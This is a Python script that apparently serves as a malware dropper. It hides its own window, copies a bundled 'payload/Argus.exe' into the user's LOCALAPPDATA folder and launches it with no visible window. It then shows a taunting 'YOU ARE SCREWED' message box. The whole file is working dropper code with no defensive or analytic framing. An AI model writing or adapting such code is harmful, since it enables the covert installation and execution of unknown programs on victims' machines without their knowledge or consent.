import os
import shutil
import subprocess
import sys
from pathlib import Path
import tkinter as tk
from tkinter import messagebox

def resource_path(relative_path):
    if getattr(sys, "frozen", False) and hasattr(sys, "_MEIPASS"):
        base_path = Path(sys._MEIPASS)
        return base_path / relative_path

    return Path(__file__).resolve().parent / "app" / relative_path

def main():
    root = tk.Tk()
    root.withdraw()

    source_exe = resource_path(Path("payload") / "Argus.exe")

    argus_dir = Path(os.environ["LOCALAPPDATA"]) / "Argus"
    argus_dir.mkdir(parents=True, exist_ok=True)

    destination_exe = argus_dir / "Argus.exe"

    shutil.copy2(source_exe, destination_exe)

    subprocess.Popen([str(destination_exe)], creationflags=subprocess.CREATE_NO_WINDOW)

    print(f"Copied to: {destination_exe}")
    messagebox.showwarning("ZHASK", "YOU ARE SCREWED")

if __name__ == "__main__":
    main()